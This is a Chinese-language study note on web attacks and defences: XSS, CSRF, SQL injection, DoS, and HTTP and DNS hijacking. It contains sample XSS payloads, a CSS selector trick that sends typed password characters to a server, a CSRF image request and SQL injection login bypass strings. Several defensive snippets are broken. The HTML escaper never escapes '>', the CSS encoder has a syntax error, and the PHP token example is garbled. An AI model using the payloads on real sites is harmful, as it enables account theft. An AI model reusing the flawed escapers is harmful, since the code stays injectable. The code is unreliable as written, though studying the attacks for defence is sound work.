

# 网络安全

## XSS

跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。 它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。

### XSS的危害

据近些年OWASP(OWASP是世界上最知名的Web安全与数据库安全研究组织)统计XSS占所有web攻击的22%，高居所有web威胁榜首

- 流量劫持
- 获取用户cookie信息，盗取账号
- 篡改、删除页面信息
- 配合CSRF攻击，实施进一步的攻击

### XSS攻击的分类

**1、反射型**

又称为非持久性跨站点脚本攻击。漏洞产生的原因是攻击者注入的数据反映在响应中。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。也就是我上面举的那个简单的XSS攻击案例，通过url参数直接注入。然后在响应的数据中包含着危险的代码。

当黑客把这个链接发给你，你就中招啦！

**2、存储型**

又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。持久的XSS相比非持久性XSS攻击危害性更大,容易造成蠕虫，因为每当用户打开页面，查看内容时脚本将自动执行。

### XSS攻击的注入点

![](/home/xsh/桌面/markdown/imgs/74e8358930bf060b86bb8cc00740b93c.png)



#### **HTML节点内容**

这个其实就是我之前演示的，HTML节点中暗藏攻击脚本。

![](/home/xsh/桌面/markdown/imgs/2554423959-5a8cf5d92f1a3_articlex.png)



#### **HTML属性**

这里img的src属性是由用户传递过来的值，当用户把图片地址写成：1"%20onerror="alert(%27哈哈被攻击%27)

![](/home/xsh/桌面/markdown/imgs/3790960228-5a8cf8f6d2687_articlex.png)

#### **JavaScript代码 （字符串提前关闭）**

当JavaScript代码中有一个变量是由用户提供的数据，这个数据也有可能之前被写入了数据库。如下图，当用户输入的内容为：
小柚子";alert(%27哈哈你被攻击了！%27);"

#### **富文本**

大家都知道，富文本其实就是一段HTML。既然它是一段HTML，那么就存在XSS攻击。而且富文本攻击的防御相对比较麻烦。

#### 在url中

作用范围：将不可信数据作为 URL 参数值时需要对参数进行 URL 编码

编码规则：将参数值进行 encodeURIComponent 编码

```js
  function encodeForURL(str, kwargs){
    return encodeURIComponent(str);
  };

```



#### 在 `CSS` 中输出

在 `CSS` 中或者 `style` 标签或者 `style attribute` 中形成的攻击花样非常多，总体上类似于下面几个例子：

```js
<style>@import url('http:xxxxx')</style>
<style>@import 'http:xxxxx'</style>
<style>li {list-style-image: url('xxxxxx')}</style>
<style>body {binding:url('xxxxxxxxxx')}</style>
<div style='background-image: url(xxxx)'></div>
<div style='width: expression(xxxxx)'></div>
```

要解决 `CSS` 的攻击问题，一方面要严格控制用户将变量输入`style` 标签内，另一方面不要引用未知的 `CSS` 文件，如果一定有用户改变 `CSS` 变量这种需求的话，可以使用 `OWASP ESAPI` 中的 `encodeForCSS()` 函数。

```js
input[type="password"][value$="0"]{ background-image: url("http://localhost:3000/0") }
input[type="password"][value$="1"]{ background-image: url("http://localhost:3000/1") }
input[type="password"][value$="2"]{ background-image: url("http://localhost:3000/2") }
input[type="password"][value$="3"]{ background-image: url("http://localhost:3000/3") }
input[type="password"][value$="4"]{ background-image: url("http://localhost:3000/4") }
input[type="password"][value$="5"]{ background-image: url("http://localhost:3000/5") }
input[type="password"][value$="6"]{ background-image: url("http://localhost:3000/6") }
input[type="password"][value$="7"]{ background-image: url("http://localhost:3000/7") }
input[type="password"][value$="8"]{ background-image: url("http://localhost:3000/8") }
input[type="password"][value$="9"]{ background-image: url("http://localhost:3000/9") }
```

剩下的就不写了，就是将所有键盘能输入的字符都写进去。

`input[type="password"]` 是css选择器，作用是选择密码输入框，`[value$="0"]`表示匹配输入的值是以 0 结尾的。

所以如果你在密码框中输入 0 ，就去请求 `http://localhost:3000/0` 接口，但是浏览器默认情况下是不会将用户输入的值存储在 `value` 属性中，但是有的框架会同步这些值，例如`React`

### XSS攻击防御

chrome浏览器自带防御,可拦截反射性XSS（HTML内容和属性），js和富文本的无法拦截，所以我们必须得自己做一些防御手段。

#### **HTML节点内容的防御**（`HTMLEncode`）

将用户输入的内容进行转义：

```js
var escapeHtml = function(str) {
    str = str.replace(/</g,'&lt;');
    str = str.replace(/</g,'&gt;');
    return str;
}
ctx.render('index', {comments, from: escapeHtml(ctx.query.from || '')});

```

针对 `HTML` 代码的编码方式是 `HTMLEncode`，它的作用是将字符串转换成 `HTMLEntities`。

目前来说，为了对抗 `XSS` ，以下转义内容是必不可少的

| 特殊字符 | 实体编码 |
| -------- | -------- |
| &        | &amp ;   |
| <        | &lt ;    |
| >        | &gt ;    |
| "        | &quot ;  |
| '        | &#x27 ;  |
| /        | &#x2F ;  |

```js
const HtmlEncode = (str) => {
    // 设置 16 进制编码，方便拼接
    const hex = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'];
    // 赋值需要转换的HTML
    const preescape = str;
    let escaped = "";
    for (let i = 0; i < preescape.length; i++) {
        // 获取每个位置上的字符
        let p = preescape.charAt(i);
        // 重新编码组装
        escaped = escaped + escapeCharx(p);
    }

    return escaped;
    // HTMLEncode 主要函数
    // original 为每次循环出来的字符
    function escapeCharx(original) {
        // 默认查到这个字符编码
        let found = true;
        // charCodeAt 获取 16 进制字符编码
        const thechar = original.charCodeAt(0);
        switch (thechar) {
            case 10: return "<br/>"; break; // 新的一行
            case 32: return "&nbsp;"; break; // space
            case 34: return "&quot;"; break; // "
            case 38: return "&amp;"; break; // &
            case 39: return "&#x27;"; break; // '
            case 47: return "&#x2F;"; break; // /
            case 60: return "&lt;"; break; // <
            case 62: return "&gt;"; break; // >
            case 198: return "&AElig;"; break; // Æ
            case 193: return "&Aacute;"; break; // Á
            case 194: return "&Acirc;"; break; // Â
            case 192: return "&Agrave;"; break; // À
            case 197: return "&Aring;"; break; // Å
            case 195: return "&Atilde;"; break; // Ã
            case 196: return "&Auml;"; break; // Ä
            case 199: return "&Ccedil;"; break; // Ç
            case 208: return "&ETH;"; break; // Ð
            case 201: return "&Eacute;"; break; // É
            case 202: return "&Ecirc;"; break;
            case 200: return "&Egrave;"; break;
            case 203: return "&Euml;"; break;
            case 205: return "&Iacute;"; break;
            case 206: return "&Icirc;"; break;
            case 204: return "&Igrave;"; break;
            case 207: return "&Iuml;"; break;
            case 209: return "&Ntilde;"; break;
            case 211: return "&Oacute;"; break;
            case 212: return "&Ocirc;"; break;
            case 210: return "&Ograve;"; break;
            case 216: return "&Oslash;"; break;
            case 213: return "&Otilde;"; break;
            case 214: return "&Ouml;"; break;
            case 222: return "&THORN;"; break;
            case 218: return "&Uacute;"; break;
            case 219: return "&Ucirc;"; break;
            case 217: return "&Ugrave;"; break;
            case 220: return "&Uuml;"; break;
            case 221: return "&Yacute;"; break;
            case 225: return "&aacute;"; break;
            case 226: return "&acirc;"; break;
            case 230: return "&aelig;"; break;
            case 224: return "&agrave;"; break;
            case 229: return "&aring;"; break;
            case 227: return "&atilde;"; break;
            case 228: return "&auml;"; break;
            case 231: return "&ccedil;"; break;
            case 233: return "&eacute;"; break;
            case 234: return "&ecirc;"; break;
            case 232: return "&egrave;"; break;
            case 240: return "&eth;"; break;
            case 235: return "&euml;"; break;
            case 237: return "&iacute;"; break;
            case 238: return "&icirc;"; break;
            case 236: return "&igrave;"; break;
            case 239: return "&iuml;"; break;
            case 241: return "&ntilde;"; break;
            case 243: return "&oacute;"; break;
            case 244: return "&ocirc;"; break;
            case 242: return "&ograve;"; break;
            case 248: return "&oslash;"; break;
            case 245: return "&otilde;"; break;
            case 246: return "&ouml;"; break;
            case 223: return "&szlig;"; break;
            case 254: return "&thorn;"; break;
            case 250: return "&uacute;"; break;
            case 251: return "&ucirc;"; break;
            case 249: return "&ugrave;"; break;
            case 252: return "&uuml;"; break;
            case 253: return "&yacute;"; break;
            case 255: return "&yuml;"; break;
            case 162: return "&cent;"; break;
            case '\r': break;
            default: found = false; break;
        }
        if (!found) {
            // 如果和上面内容不匹配且字符编码大于127的话，用unicode(非常严格模式)
            if (thechar > 127) {
                let c = thechar;
                let a4 = c % 16;
                c = Math.floor(c / 16);
                let a3 = c % 16;
                c = Math.floor(c / 16);
                let a2 = c % 16;
                c = Math.floor(c / 16);
                let a1 = c % 16;
                return "&#x" + hex[a1] + hex[a2] + hex[a3] + hex[a4] + ";";
            } else {
                return original;
            }
        }
    }
}
```

#### 对js代码(`JavaScriptEncode`)

`JavaScriptEncode` 与 `HTMLEncode` 的编码方式不同，它需要用 `\` 对特殊字符进行转义。

在对抗 `XSS` 时，还要求输出的变量必须在引号内部，以免造成安全问题，可是很多开发者并没有这种习惯，这样只能使用更为严格的 `JavaScriptEncode` 来保证数据安全：除了数字，字符之外的所有字符，小于127的字符编码都使用十六进制 `\xHH` 的方式进行编码，大于用unicode（非常严格模式）。

同样是代码的方式展现出来：

```js
//使用“\”对特殊字符进行转义，除数字字母之外，小于127使用16进制“\xHH”的方式进行编码，大于用unicode（非常严格模式）。
// 大部分代码和上面一样，我就不写注释了
const JavaScriptEncode = function (str) {
    const hex = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'];
    const preescape = str;
    let escaped = "";
    for (let i = 0; i < preescape.length; i++) {
        escaped = escaped + encodeCharx(preescape.charAt(i));
    }
    return escaped;
    // 小于127转换成十六进制
    function changeTo16Hex(charCode) {
        return "\\x" + charCode.charCodeAt(0).toString(16);
    }
    function encodeCharx(original) {
        let found = true;
        const thecharchar = original.charAt(0);
        const thechar = original.charCodeAt(0);
        switch (thecharchar) {
            case '\n': return "\\n"; break; //newline
            case '\r': return "\\r"; break; //Carriage return
            case '\'': return "\\'"; break;
            case '"': return "\\\""; break;
            case '\&': return "\\&"; break;
            case '\\': return "\\\\"; break;
            case '\t': return "\\t"; break;
            case '\b': return "\\b"; break;
            case '\f': return "\\f"; break;
            case '/': return "\\x2F"; break;
            case '<': return "\\x3C"; break;
            case '>': return "\\x3E"; break;
            default: found = false; break;
        }
        if (!found) {
            if (thechar > 47 && thechar < 58) { //数字
                return original;
            }
            if (thechar > 64 && thechar < 91) { //大写字母
                return original;
            }
            if (thechar > 96 && thechar < 123) { //小写字母
                return original;
            }
            if (thechar > 127) { //大于127用unicode
                let c = thechar;
                let a4 = c % 16;
                c = Math.floor(c / 16);
                let a3 = c % 16;
                c = Math.floor(c / 16);
                let a2 = c % 16;
                c = Math.floor(c / 16);
                let a1 = c % 16;
                return "\\u" + hex[a1] + hex[a2] + hex[a3] + hex[a4] + "";
            } else {
                return changeTo16Hex(original);
            }
        }
    }
}
```

除了 `HTMLEncode` 和 `JavaScript` 外，还有许多用于各种情况的编码函数，比如 `XMLEncode` 、`JSONEncode` 等。

编码函数需要在适当的情况下用适当的函数，需要注意的是，编码之后数据长度发生改变，如果文件对数据长度有所限制的话，可能会影响到某些功能。我们在使用编码函数时，一定要注意这个细节，以免产生不必要的 `bug`

#### 在 `CSS` 中输出

主要是对css进行防御

```js
function encodeForCSS (attr, str, kwargs){
    let encoded = '';
    for (let i = 0; i < str.length; i++) {
      let ch = str.charAt(i);
      if (!ch.match(/[a-zA-Z0-9]/) {
        let hex = str.charCodeAt(i).toString(16);
        let pad = '000000'.substr((hex.length));
        encoded += '\\' + pad + hex;
      } else {
        encoded += ch;
      }
    }
    return encoded;
  };

```



#### 富文本处理

在一些网站，网站允许用户富含 `HTML` 标签的代码，比如文本里面要有图片、视频之类，这些文本展现出来全都是依靠 `HTML` 代码来实现。

那么，我们需要如何区分安全的 `富文本` 和 `XSS` 攻击呢？

我正好在华为做过相关的富文本过滤操作，基本的思想就是：

1. 首先进行输入检查，保证用户输入的是完整的 `HTML` 代码，而不是有拼接的代码
2. 通过 `htmlParser` 解析出 `HTML` 代码的标签、属性、事件
3. `富文本` 的 `事件` 肯定要被禁止，因为`富文本` 并不需要 `事件` 这种东西，另外一些危险的标签也需要禁止，例如： `<iframe>`，`<script>`，`<base>`，`<form>` 等
4. 利用白名单机制，只允许安全的标签嵌入，例如：`<a>`，`<img>`，`div`等，白名单不仅仅适用于标签，也适用于`属性`
5. 过滤用户 `CSS` ，检查是否有危险代码

#### 后台对用户数据做编码处理(前后端共用)

此外`httpOnly`、`CSP`、`X-XSS-Protection`、`Secure Cookie` 等也可以起到有效的防护

CSP:内容安全策略（CSP）是一种声明机制，允许Web开发者在其应用程序上指定多个安全限制，由支持的用户代理（浏览器）来负责强制执行 http和meta标签内

X-XSS-Protection:HTTP **X-XSS-Protection**响应标头是Internet Explorer，Chrome和Safari的一项功能，可在检测到反映的跨站点脚本（[XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)）攻击时阻止页面加载。虽然这些保护在现代浏览器中很大程度上是不必要的，当站点实现强大[`Content-Security-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)禁用内联JavaScript（`'unsafe-inline'`）时，它们仍然可以为尚未支持[CSP](https://developer.mozilla.org/en-US/docs/Glossary/CSP)的旧版Web浏览器的用户提供保护。

```
X-XSS-Protection：0 禁用XSS过滤。

X-XSS-Protection：1  启用XSS过滤（通常在浏览器中默认）。如果检测到跨站点脚本攻击，浏览器将清理页面
X-XSS-Protection：1; 模式=块 启用XSS过滤。如果检测到攻击，浏览器将阻止呈现页面，而不是清理页面。
X-XSS-Protection：1; 报告= <报告-URI>
启用XSS过滤。如果检测到跨站点脚本攻击，浏览器将清理页面并报告违规。这使用CSP report-uri指令的功能来发送报告。

```



## CSRF(别的网站借用你cookie登录的权限做一些操作)

跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。

简单的说，就是利用游览器对用户的信任，比如，用户已经登录了ww.aaa.com，自然aaa这个网站就会将用户的登录状态session存在cookie中；
然后，aaa.com这个网页有一个对作品点赞的功能，点赞提交地址为`aaa.com/api.like?id=777`；
这时，另外一个叫www.bbb.com的网站，放了这样一个元素`<img src="aaa.com/api.like?id=888">`，这样的话，一旦用户进入这个bbb.com页面，就会请求aaa.com这个网站的点赞接口，而且点赞的用户对象是888；
最后因为用户的登录信息尚未过期，那就等于给id为888这个作品点赞了，然而，用户并不知情。

### CSRF危害

简单总结 CSRF 漏洞就是利用网站权限校验方面的漏洞在用户不知觉的情况下发送请求，达到“伪装”用户的目的。攻击者利用 CSRF 实现的攻击主要有以下几种：

1. 攻击者能够欺骗受害用户完成该受害者所允许的任一状态改变的操作，比如：更新账号细节，完成购物，注销甚至登录等操作
2. 获取用户的隐私数据
3. 配合其他漏洞攻击
4. CSRF 蠕虫

其中 CSRF 蠕虫如其名所指就是产生蠕虫效果，会将 CSRF 攻击一传十，十传百。如：某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大！。

### 防御方法

从上文的描述中我们可以知道 CSRF 有两个特点：**利用 cookie 自动携带的特性**以及**跨站**攻击。那么针对这两个特性可以使用如下解决方法。



#### 检查 Referer 字段

大家都知道 HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。通过在网站中校验请求的该字段，我们能知道请求是否是从本站发出的。我们可以拒绝一切非本站发出的请求，这样避免了 CSRF 的跨站特性。

```js
const { parse } = require('url');
module.exports = class extends think.Logic {
  indexAction() {
    const referrer = this.ctx.referrer();
    const {host: referrerHost} = parse(referrer);
    if(referrerHost !== 'xxx') {
        return this.fail('REFERRER_ERROR');
    }
  }
}
```

这种方式利用了客户端无法构造 Referrer 的特性，虽然简单，不过当网站域名有多个，或者经常变换域名的时候会变得非常的麻烦，同时也具有一定的局限性。

#### Token 验证

由于 CSRF 是利用了浏览器自动传递 cookie 的特性，另外一个防御思路就是校验信息不通过 cookie 传递，在其他参数中增加随机加密串进行校验。这里又有两种办法：

随机字符串：为每一个提交增加一个随机串参数，该参数服务端通过页面下发，每次请求的时候补充到提交参数中，服务端通过校验该参数是否一致来判断是否是用户请求。由于 CSRF 攻击中攻击者是无从事先得知该随机字符串的值，所以服务端就可以通过校验该值拒绝可以请求。

JWT：实际上除了 session 登录之外，现在越来越流行 JWT token 登录校验。该方式是在前端记录登录 token，每次请求的时候通过在 Header 中添加认证头的方式来实现登录校验过程。由于 CSRF 攻击中攻击者无法知道该 token 值，通过这种方式也是可以防止 CSRF 攻击的

#### cookie加samesite原理同refer判断来源

#### 后台hash值防御

```js
<?php
　　　　//构造加密的Cookie信息
 　　　　$value=“DefenseSCRF”;
 　　　　setcookie(”cookie” ,$value,time ()+3600);
　　?>

　　在表单里增加Hash值，以认证这确实是用户发送的请求。

<?php
 　　　　$hash =md5($_COOKIE[' cookie']);
 　　?>
 　　< formmethod=”POST”action=”transfer. php”>
 　　　　<inputtype= ”text”name=”toBankId”>
 　　　　<
       inputtype=”text”name=”money” >
　　　　<inputtype=”hidden”name =”hash”value=”<?=$hash ;?>”>
　　　　< inputtype=”submit”name=”submit”value =”Submit”>
　　</ form>
```

　　然后在服务器端进行Hash值验证

```js
 <?php
 　　 if(isset($_POST[' check'])){
 　　 $hash
=md5($_COOKIE[ 'cookie']);
　　 if($_POST['check ']==$hash){
　　 doJob();
　　
} else{
　　　　　　　　//...
　　 }
　　 } else{
　　　　　　//...
　　 }

?>
```

####  重点表单带验证码

## SQL注入

SQL 注入是通过在用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为

```js
// user.js
module.exports = class extends think.Controller {
  async loginAction() {
    const { username, password } = this.post();
    const user = await this.model().query(
      `SELECT * FROM user WHERE name = "${username}" AND password= "${password}"`
    );

    if (think.isEmpty(user)) {
      return this.fail();
    }
    return this.success(user);
  }
}
```

当用户提交的 `username` 是 `admin"; --` 的话，最终执行的 SQL 语句就会变成

```js
SELECT * FROM user WHERE name = "admin"; --" AND password= "111"
```

最终攻击者就可以成功登录 admin 账号了，这就是最简单的 SQL 注入了。从上面这个简单示例中，我们发现漏洞成因可以归结为以下两个原因叠加造成的：

1. 程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句。
2. 未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中。

SQL注入根据攻击者获取数据的方式分为**回显注入**、**报错注入**以及**盲注**。刚才演示的直接从返回结果中获取数据则为回显注入，当然也可以通过 MySQL 执行的报错结果中嗅探到数据库的结构和内容，这就是报错注入。盲注则是根据数据库执行的延时等操作来判断是否接近正确值，简单的说来有点像是拿着听诊器试探保险箱的密码的感觉。

不同的分类原则会有不同的分类，也有按照注入位置及方式不同进行分类分为**POST注入**、**GET注入**、**cookie注入**、**盲注**、**延时注入**、**搜索注入**、**base64注入**等。不过大家都支持分类形式不同，原理还是一致的，这里就不一一细说了。

### SQL危害

如果网站存在 SQL 注入漏洞，相当于将数据库直接暴露在攻击者面前，可想而知危害会有多大了。攻击者利用 SQL 注入漏洞能实现以下攻击：

1. 跳过账户权限验证达到越权
2. 获取数据库关键信息从而进行脱库
3. 在特别情况下还可以修改数据库内容或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过SQL注入漏洞直接获取webshell或者服务器系统权限。

###  防御方法

#### 数据校验

从文章开头可以看到，其实漏洞的主要原因还是没有对用户输入的数据进行过滤，**所以对来自用户的数据（GET, POST, cookie 等）最好做到以下两种过滤校验**：

检查输入的数据是否具有所期望的数据格式。这种在参数是数字的时候特别有效，如果攻击者选择在参数中插入内容的话则会被转换成 `NaN` 导致攻击失败。在 ThinkJS 中我们提供了强大的 [Logic](https://link.juejin.im?target=https%3A%2F%2Fthinkjs.org%2Fzh-cn%2Fdoc%2F3.0%2Flogic.html) 功能可以方便的对数据进行格式校验。

使用数据库特定的敏感字符转义函数把用户提交上来的非数字数据进行转义。在 [ThinkJS](https://link.juejin.im?target=https%3A%2F%2Fthinkjs.org) 中封装了 [escapeString()](https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fthinkjs%2Fthink-model-mysql%2Fblob%2Fmaster%2Flib%2Fparser.js%23L24-L46) 方法可以对敏感字符进行转义，其原理则和 PHP 的 [mysql_escape_string()](https://link.juejin.im?target=http%3A%2F%2Fphp.net%2Fmanual%2Fzh%2Ffunction.mysql-escape-string.php) 方法是一致的。

检查输入数据格式在 ThinkJS 中还能防止另外一种非通用 SQL 安全问题。文章开头的示例代码我们在实际的应用中一般会这么写：

```js
module.exports = class extends think.Controller {
  async loginAction() {
    const { username, password } = this.post();
    const user = await this.model('user').where({
      name: username,
      password
    }).find();

    if (think.isEmpty(user)) {
      return this.fail();
    }
    return this.success(user);
  }
}
```

当我们构造如 `name=admin&password[]=!%3D&password[]=` 的请求参数时，最终执行的 Model 语句就会变成

```js
this.model('user').where({name: 'admin', password: ['!=', '']});
```

除了数据校验，也可以选择使用数据库的存储过程和预定义指针等特性来抽象数库访问，使用户不能直接访问数据表和视图。但这个办法又有别的影响。

#### 权限限制

严格限制Web应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害。**请记住永远不要使用超级用户或所有者帐号去连接数据库！**当数据库被攻击时将损伤限制在当前表的范围是比较明智的选择。通过权限限制可以防止攻击者获取数据库其它信息，甚至利用数据库执行 Shell 命令等操作。

#### 日志处理

当数据库操作失败的时候，尽量**不要将原始错误日志返回**，比如类型错误、字段不匹配等，把代码里的 SQL 语句暴露出来，以防止攻击者利用这些错误信息进行 SQL 注入。除此之外，在允许的情况下，**使用代码或数据库系统保存查询日志**也是一个好办法。显然，日志并不能防止任何攻击，但定期审计数据库执行日志可以跟踪是否存在应用程序正常逻辑之外的 SQL 语句执行。日志本身没用，要查阅其中包含的信息才行。毕竟，更多的信息总比没有要好。

## DDos&DoS

  DoS（Denial Of Service），拒绝服务的缩写，是指故意攻击网络协议实现的缺陷或直接通过野 蛮手段耗尽被攻击对象的资源，目的是让目标计算机或网络无法提供正常的服务，使目标系统停止响应甚至崩溃。这些服务资源包括网络带宽，文件系统空间容量，开放的进程或者允许的连接。这种攻击会导致资源的匮乏，无论计算机的处理速度多快、内存容量多大、网络带宽的速度多快都无法避免这种攻击带来的后果。

 大多数的DoS攻击是需要相当大的带宽的，而以个人为单位的黑客没有可用的高带宽资源。为了克服这个缺点，DoS攻击者开发了分布式的攻击。攻击者利用工具集合许多的网络带宽来同时对同一个目标发动大量的攻击请求，这就是DDoS（Distributed Denial Of Service）攻击。可以说DDoS攻击是由黑客集中控制发动的一组DoS攻击的集合，这种方式被认为是最有效的攻击形式，并且非常难以抵挡。

### 如何预防网站被DoS/DDoS攻击

DoS/DDoS预防涉及硬件和软件，这里只介绍Web应用如何预防，如果我们的web系统遭受攻击，整个系统可能会因为内存泄漏，CPU资源耗尽，连接数被耗尽等，使得网站无法提供服务。

1. 首先，所有的http/https请求，必须通过身份的验证，没有登录的用户拒绝响应。这是必须做的，身份验证会增加攻击的难度
2. 控制数据包的大小，根据自己的业务，设置数据包的最大值，当大于这个值的情况下可以拒绝服务。（业务最大只需要3M, 那么100M的请求就被拒绝了）
3. 对调用的参数进行校验，比如传输一个很大的数组给后台服务器，在多个请求同时遍历大数组的情况下，会导致CPU资源耗尽。
4.  除登录用户的校验，还必须增加随机数校验，解决跨站请求伪造的同时，大大增加了Dos攻击的难度。
5. 在服务器响应中，不能无限启动新的线程。如果需要多线程处理，需要使用线程池的机制，并控制线程的数量。同时保证线程池不能过多，不能再请求中生成线程池。
6. 请求要有超时机制，防止请求线程被长时间占用，从而导致线程中的资源无法释放

## HTTP劫持

> HTTP劫持是在使用者与其目的网络服务所建立的专用数据通道中，监视特定数据信息，提示当满足设定的条件时，就会在正常的数据流中插入精心设计的网络数据报文，目的是让用户端程序解释“错误”的数据，并以弹出新窗口的形式在使用者界面展示宣传性广告或者直接显示某网站的内容。



![](/home/xsh/桌面/markdown/imgs/6216c715bb9f605d7c2c7f1577a2afb4.png)



**HTTPS**
 HTTPS在应用层又加了SSL协议，会对数据进行加密，当然加密也是有代价的，不同于TCP/IP的三次握手，它需要七次握手，而且加上加密解密等因素，整个系统的性能大概会下降1/10，这样就能基本避免运营商劫持了，毕竟它运营商也会核算成本的，不会像gfw一样有100多层过滤 ：）

**加代码**
 如果没法使用HTTPS，就必须在网页中手动加入代码过滤了。具体的思路是网页在浏览器中加载完毕后用JavaScript代码检查所有的外链是否属于白名单，限于篇幅就不写在这里了。大家可以参考这个连接：

https://link.jianshu.com/?t=http://www.cnblogs.com/kenkofox/p/4924088.html

### (防止百度转码)meta

```html
<meta http-equive="Cache-Control" content="no-siteapp" />
```



## DNS劫持

DNS劫持又称[域名劫持](https://link.juejin.im?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2F%25E5%259F%259F%25E5%2590%258D%25E5%258A%25AB%25E6%258C%2581)，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。其实本质就是对DNS解析服务器做手脚，或者是使用伪造的DNS解析服务器可以通过下图来展示

![](/home/xsh/桌面/markdown/imgs/eadef534e6c4347b6e2e6feb91e97b89.png)

### 解决办法

DNS的劫持过程是通过攻击运营商的解析服务器来达到目的。我们可以不用运营商的DNS解析而使用自己的解析服务器或者是提前在自己的App中将解析好的域名以IP的形式发出去就可以绕过运营商DNS解析，这样一来也避免了DNS劫持的问题